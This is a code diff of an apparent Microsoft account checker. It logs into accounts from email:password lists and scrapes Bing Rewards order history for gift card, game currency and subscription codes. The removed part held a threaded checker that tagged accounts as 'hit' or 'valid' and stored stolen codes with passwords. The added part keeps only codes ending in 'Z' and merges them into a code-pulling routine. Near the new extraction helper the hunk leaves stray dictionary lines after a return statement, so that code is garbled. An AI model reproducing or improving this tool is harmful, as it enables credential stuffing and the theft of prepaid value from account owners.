@@ -38,37 +38,6 @@ MICROSOFT_OAUTH_URL = (
 
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0"
 
-CATEGORY_CONFIG = {
-    "Minecraft": {
-        "keywords": ["minecraft", "minecoins", "minecraft minecoins", "minecoin", "minecraft coins"],
-        "displayName": "Minecraft",
-    },
-    "Roblox": {
-        "keywords": ["roblox", "robux", "roblox robux", "roblox digital", "roblox card"],
-        "displayName": "Roblox",
-    },
-    "League of Legends": {
-        "keywords": ["league of legends", "lol", "riot points", "rp", "league rp"],
-        "displayName": "League of Legends",
-    },
-    "Overwatch": {
-        "keywords": ["overwatch", "overwatch coins", "overwatch league tokens", "owl tokens"],
-        "displayName": "Overwatch",
-    },
-    "Sea of Thieves": {
-        "keywords": ["sea of thieves", "sea thieves", "ancient coins", "sof coins"],
-        "displayName": "Sea of Thieves",
-    },
-    "Game Pass": {
-        "keywords": ["game pass", "xbox game pass", "gamepass", "xbox gamepass"],
-        "displayName": "Game Pass",
-    },
-    "GIFTCARDS": {
-        "keywords": ["gift card", "giftcard", "gift cards", "amazon", "steam", "playstation", "xbox", "nintendo", "target", "starbucks", "subway", "doordash", "uber eats", "uber", "walmart"],
-        "displayName": "Gift Cards",
-    },
-}
-
 CODE_PATTERNS = [
     re.compile(r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b'),
     re.compile(r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b'),
@@ -336,98 +305,9 @@ def extract_codes_from_text(text):
     return codes
 
 
-def detect_category_from_title(title, full_row_text):
-    text = (full_row_text or title).lower()
-    if any(k in text for k in ["overwatch", "overwatch coins", "owl tokens"]):
-        return "Overwatch"
-    if any(k in text for k in ["sea of thieves", "sea thieves", "ancient coins", "monedas", "alijo secreto", "tesoro oculto", "lost chest", "secret cache"]):
-        return "Sea of Thieves"
-    if any(k in text for k in ["roblox", "robux"]):
-        return "Roblox"
-    if any(k in text for k in ["league of legends", "lol", "riot points", "puntos riot", "ra-"]):
-        return "League of Legends"
-    if any(k in text for k in ["game pass", "xbox game pass", "gamepass"]):
-        return "Game Pass"
-    if any(k in text for k in ["minecraft", "minecoins", "monedas minecraft"]):
-        return "Minecraft"
-    if any(k in text for k in ["gift card", "giftcard", "amazon", "steam", "playstation", "xbox", "nintendo", "target", "starbucks", "subway", "doordash", "uber eats", "uber", "walmart", "spotify", "premium", "tarjeta regalo"]):
-        return "GIFTCARDS"
-    return "Unknown"
-
-
-def extract_code_info(title, category, full_row_text):
-    lower = title.lower()
-    if category == "All":
-        detected = detect_category_from_title(title, full_row_text)
-        if detected != "Unknown":
-            return extract_code_info(title, detected, full_row_text)
-
-    amount = None
-    amount_patterns = {
-        "Minecraft": r'(\d+)\s*(?:minecoins|coins|minecraft coins)',
-        "Roblox": r'(\d+)\s*(?:robux|rbx|r\$)',
-        "League of Legends": r'(\d+)\s*(?:rp|riot points)',
-        "Overwatch": r'(\d+)\s*(?:coins|tokens|league tokens)',
-        "Sea of Thieves": r'(\d+)\s*(?:coins|ancient coins)',
-        "Game Pass": r'(\d+)\s*(?:month|months|day|days)',
-        "GIFTCARDS": r'\$(\d+)(?:\.\d{2})?',
-    }
-    pat = amount_patterns.get(category)
-    if pat:
-        m = re.search(pat, lower)
-        if m:
-            amount = m.group(1)
-    if not amount:
-        m = re.search(r'(\d+)\s*(?:monedas|coins|pièces|moedas)', lower)
-        if m:
-            amount = m.group(1)
-
-    if category == "Minecraft" and amount:
-        return f"{amount} MINECOINS CODE FOUND"
-    if category == "Roblox" and amount:
-        return f"{amount} ROBUX CODE FOUND"
-    if category == "League of Legends" and amount:
-        return f"{amount} RP CODE FOUND"
-    if category == "Overwatch" and amount:
-        return f"{amount} OVERWATCH COINS CODE FOUND"
-    if category == "Sea of Thieves" and amount:
-        return f"{amount} ANCIENT COINS CODE FOUND"
-    if category == "Game Pass":
-        if amount:
-            if "month" in lower:
-                return f"{amount} MONTH GAME PASS CODE FOUND"
-            if "day" in lower:
-                return f"{amount} DAY GAME PASS CODE FOUND"
-        return "GAME PASS CODE FOUND"
-    if category == "GIFTCARDS":
-        types = [
-            ("amazon", "AMAZON"), ("steam", "STEAM"), ("playstation", "PLAYSTATION"),
-            ("psn", "PLAYSTATION"), ("xbox", "XBOX"), ("nintendo", "NINTENDO"),
-            ("target", "TARGET"), ("starbucks", "STARBUCKS"), ("subway", "SUBWAY"),
-            ("doordash", "DOORDASH"), ("uber eats", "UBER EATS"), ("uber", "UBER EATS"),
-            ("walmart", "WALMART"),
-        ]
-        for kw, label in types:
-            if kw in lower:
-                return f"${amount} {label} GIFT CARD FOUND" if amount else f"{label} GIFT CARD FOUND"
-        if "spotify" in lower or "premium" in lower:
-            if "3 month" in lower:
-                return "3 MONTHS SPOTIFY PREMIUM FOUND"
-            if "1 month" in lower:
-                return "1 MONTH SPOTIFY PREMIUM FOUND"
-            if "6 month" in lower:
-                return "6 MONTHS SPOTIFY PREMIUM FOUND"
-            if "12 month" in lower or "1 year" in lower:
-                return "12 MONTHS SPOTIFY PREMIUM FOUND"
-            return "SPOTIFY PREMIUM FOUND"
-        return f"${amount} GIFT CARD FOUND" if amount else "GIFT CARD FOUND"
-
-    return f"{category.upper()} CODE FOUND"
-
-
-def scrape_order_history(session, selected_category):
-    results = []
-    seen_codes = set()
+def scrape_z_codes_from_rewards(session):
+    codes = []
+    seen = set()
 
     try:
         resp = session.get("https://rewards.bing.com/redeem/orderhistory", extra_headers={
@@ -459,19 +339,12 @@ def scrape_order_history(session, selected_category):
         rows = extract_table_rows(text)
 
         for row in rows:
-            full_row_text = row["text"]
             get_code_match = re.search(r'id="OrderDetails_[^"]*"[^>]*data-actionurl="([^"]*)"', row["html"])
 
             if get_code_match:
                 action_url = get_code_match.group(1).replace("&amp;", "&")
-                order_title = row["cells"][2]["text"] if len(row["cells"]) > 2 else ""
-                order_date = row["cells"][1]["text"] if len(row["cells"]) > 1 else ""
-                detected_category = detect_category_from_title(order_title, full_row_text)
-                code_info = extract_code_info(order_title, detected_category, full_row_text)
-
                 if action_url.startswith("/"):
                     action_url = "https://rewards.bing.com" + action_url
-
                 try:
                     post_data = ""
                     if verification_token:
@@ -481,184 +354,59 @@ def scrape_order_history(session, selected_category):
                         "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                     })
                     code_html = code_resp["text"]
-
-                    code = None
-
-                    keys = []
-                    vals = []
-                    for km in re.finditer(r"<div[^>]*class=['\"]tango-credential-key['\"][^>]*>([\s\S]*?)</div>", code_html, re.IGNORECASE):
-                        keys.append(strip_tags(km.group(1)).upper())
-                    for vm in re.finditer(r"<div[^>]*class=['\"]tango-credential-value['\"][^>]*>([\s\S]*?)</div>", code_html, re.IGNORECASE):
-                        vals.append(strip_tags(vm.group(1)))
-
-                    for i in range(len(keys)):
-                        if ("CODE" in keys[i] or "PIN" in keys[i]) and i < len(vals) and vals[i] and "*" not in vals[i]:
-                            code = vals[i]
-                            break
-
-                    if not code:
-                        pin_match = re.search(r'PIN\s*:\s*([A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4})', code_html, re.IGNORECASE)
-                        if pin_match and "*" not in pin_match.group(1):
-                            code = pin_match.group(1)
-                    if not code:
-                        code_match = re.search(r'CODE\s*:\s*([A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4})', code_html, re.IGNORECASE)
-                        if code_match and "*" not in code_match.group(1):
-                            code = code_match.group(1)
-                    if not code:
-                        clip_match = re.search(r'data-clipboard-text="([^"]+)"', code_html)
-                        if clip_match and len(clip_match.group(1).strip()) >= 15 and "*" not in clip_match.group(1):
-                            code = clip_match.group(1).strip()
-                    if not code:
-                        extracted = extract_codes_from_text(code_html)
-                        if extracted:
-                            code = extracted[0]
-
-                    redemption_url = None
-                    info_lower = code_info.lower()
-                    if any(k in info_lower for k in ["gift", "card", "$", "amazon", "spotify"]):
-                        redemption_patterns = [
-                            r"<div[^>]*class=['\"]tango-credential-key['\"][^>]*><a[^>]*href=['\"]([^'\"]*?)['\"][^>]*>Redemption URL</a></div>",
-                            r"<a[^>]*href=['\"]([^'\"]*?)['\"][^>]*>Redemption URL</a>",
-                            r"<a[^>]*href=['\"]([^'\"]*?)['\"][^>]*>Redeem</a>",
-                            r"<a[^>]*href=['\"]([^'\"]*?)['\"][^>]*>Claim</a>",
-                            r'href="([^"]*redeem[^"]*)"',
-                            r'href="([^"]*claim[^"]*)"',
-                            r'Redemption URL:\s*(https?://[^\s<>"\']+)',
-                        ]
-                        for rp in redemption_patterns:
-                            url_match = re.search(rp, code_html, re.IGNORECASE)
-                            if url_match:
-                                redemption_url = url_match.group(1).strip().replace("\n", "").replace(" ", "")
-                                break
-                    elif code and len(code.replace("-", "")) <= 8:
-                        url_match = re.search(r'<a[^>]*href="([^"]*)"[^>]*>Redemption URL</a>', code_html, re.IGNORECASE)
-                        if url_match:
-                            redemption_url = url_match.group(1)
-
-                    if code:
-                        code_key = f"{code}:{order_title}"
-                        if code_key not in seen_codes:
-                            seen_codes.add(code_key)
-                            results.append({
-                                "code": code,
-                                "info": code_info,
-                                "category": detected_category,
-                                "date": order_date or time.strftime("%Y-%m-%dT%H:%M:%S"),
-                                "redemptionUrl": redemption_url or "",
-                            })
+                    code = _extract_single_code(code_html)
+                    if code and code.upper().endswith("Z") and code not in seen:
+                        seen.add(code)
+                        codes.append(code)
                 except Exception:
                     pass
 
             elif "ResendEmail_" not in row["html"]:
-                order_title = row["cells"][2]["text"] if len(row["cells"]) > 2 else ""
-                order_date = row["cells"][1]["text"] if len(row["cells"]) > 1 else ""
                 code_cell = row["cells"][3]["text"] if len(row["cells"]) > 3 else row["cells"][2]["text"] if len(row["cells"]) > 2 else ""
-                found_codes = extract_codes_from_text(code_cell)
-                for code in found_codes:
-                    detected = detect_category_from_title(order_title, full_row_text)
-                    info = extract_code_info(order_title, detected, full_row_text)
-                    code_key = f"{code}:{order_title}"
-                    if code_key not in seen_codes:
-                        seen_codes.add(code_key)
-                        redemption_url = None
-                        info_lower = info.lower()
-                        if any(k in info_lower for k in ["gift", "card", "$", "amazon", "spotify"]):
-                            url_match = re.search(r'<a[^>]*href="([^"]*)"[^>]*>Redemption URL</a>', row["html"], re.IGNORECASE)
-                            if url_match:
-                                redemption_url = url_match.group(1)
-                        results.append({
-                            "code": code,
-                            "info": info,
-                            "category": detected,
-                            "date": order_date or time.strftime("%Y-%m-%dT%H:%M:%S"),
-                            "redemptionUrl": redemption_url or "",
-                        })
+                found = extract_codes_from_text(code_cell)
+                for c in found:
+                    if c.upper().endswith("Z") and c not in seen:
+                        seen.add(c)
+                        codes.append(c)
 
         if not rows:
-            all_codes = extract_codes_from_text(text)
-            for code in all_codes:
-                code_key = f"{code}:page"
-                if code_key not in seen_codes:
-                    seen_codes.add(code_key)
-                    results.append({
+            all_found = extract_codes_from_text(text)
+            for c in all_found:
+                if c.upper().endswith("Z") and c not in seen:
+                    seen.add(c)
+                    codes.append(c)
+    except Exception:
+        pass
+
+    return codes
+
+
+def _extract_single_code(code_html):
+    keys = []
+    vals = []
+    for km in re.finditer(r"<div[^>]*class=['\"]tango-credential-key['\"][^>]*>([\s\S]*?)</div>", code_html, re.IGNORECASE):
+        keys.append(strip_tags(km.group(1)).upper())
+    for vm in re.finditer(r"<div[^>]*class=['\"]tango-credential-value['\"][^>]*>([\s\S]*?)</div>", code_html, re.IGNORECASE):
+        vals.append(strip_tags(vm.group(1)))
+    for i in range(len(keys)):
+        if ("CODE" in keys[i] or "PIN" in keys[i]) and i < len(vals) and vals[i] and "*" not in vals[i]:
+            return vals[i]
+    pin_match = re.search(r'PIN\s*:\s*([A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4})', code_html, re.IGNORECASE)
+    if pin_match and "*" not in pin_match.group(1):
+        return pin_match.group(1)
+    code_match = re.search(r'CODE\s*:\s*([A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4})', code_html, re.IGNORECASE)
+    if code_match and "*" not in code_match.group(1):
+        return code_match.group(1)
+    clip_match = re.search(r'data-clipboard-text="([^"]+)"', code_html)
+    if clip_match and len(clip_match.group(1).strip()) >= 15 and "*" not in clip_match.group(1):
+        return clip_match.group(1).strip()
+    extracted = extract_codes_from_text(code_html)
+    return extracted[0] if extracted else None
                         "code": code,
                         "info": "CODE FOUND",
                         "category": "Unknown",
                         "date": time.strftime("%Y-%m-%dT%H:%M:%S"),
                         "redemptionUrl": "",
-                    })
-    except Exception:
-        pass
-
-    return results
-
-
-def prs_check_single_account(email, password, category):
-    session = CookieSession()
-    url_post, sft_tag = fetch_oauth_tokens(session)
-    if not url_post or not sft_tag:
-        return {"email": email, "status": "error", "codes": []}
-    token, status = fetch_login(session, email, password, url_post, sft_tag)
-    if not token:
-        return {"email": email, "status": status or "invalid", "codes": []}
-    codes = scrape_order_history(session, category)
-    filtered = codes
-    if category != "All":
-        filtered = [c for c in codes if c["category"] == category or c["category"] == "Unknown"]
-    return {
-        "email": email,
-        "status": "hit" if filtered else "valid",
-        "codes": filtered,
-    }
-
-
-def scrape_rewards(accounts, category="All", threads=10, on_progress=None, stop_event=None):
-    results = []
-    all_codes = []
-    done = [0]
-    lock = threading.Lock()
-    queue = list(accounts)
-
-    def worker():
-        while True:
-            if stop_event and stop_event.is_set():
-                break
-            with lock:
-                if not queue:
-                    break
-                account = queue.pop(0)
-            parts = account.split(":")
-            if len(parts) < 2 or not parts[0] or not parts[1]:
-                with lock:
-                    results.append({"email": account, "status": "invalid", "codes": []})
-                    done[0] += 1
-                if on_progress:
-                    on_progress(done[0], len(accounts), None)
-                continue
-            email, password = parts[0].strip(), parts[1].strip()
-            try:
-                result = prs_check_single_account(email, password, category)
-                with lock:
-                    results.append(result)
-                    if result["codes"]:
-                        all_codes.extend([{**c, "email": email, "password": password} for c in result["codes"]])
-            except Exception:
-                with lock:
-                    results.append({"email": email, "status": "error", "codes": []})
-            with lock:
-                done[0] += 1
-            if on_progress:
-                on_progress(done[0], len(accounts), results[-1] if results else None)
-
-    thread_count = min(threads, len(accounts))
-    workers = []
-    for _ in range(thread_count):
-        t = threading.Thread(target=worker)
-        t.start()
-        workers.append(t)
-    for t in workers:
-        t.join()
-    return {"results": results, "allCodes": all_codes}
 
 
 def check_single_code(code, wlid):
@@ -815,12 +563,17 @@ def pull_codes(accounts, stop_event=None):
             email, password = parsed[idx]
 
             gp_result = fetch_from_account(email, password)
-            prs_result = scrape_rewards([f"{email}:{password}"], "All", 1, None, stop_event)
+            prs_session = CookieSession()
+            prs_url_post, prs_ppft = fetch_oauth_tokens(prs_session)
+            prs_z_codes = []
+            if prs_url_post and prs_ppft:
+                prs_token, prs_status = fetch_login(prs_session, email, password, prs_url_post, prs_ppft)
+                if prs_token:
+                    prs_z_codes = scrape_z_codes_from_rewards(prs_session)
 
             gp_codes = gp_result.get("codes", [])
             gp_code_set = set(gp_codes)
-            prs_codes = [c["code"] for c in prs_result.get("allCodes", [])
-                         if c.get("code") and re.search(r'Z$', c["code"], re.IGNORECASE) and c["code"] not in gp_code_set]
+            prs_codes = [c for c in prs_z_codes if c not in gp_code_set]
 
             merged_codes = gp_codes + prs_codes
 
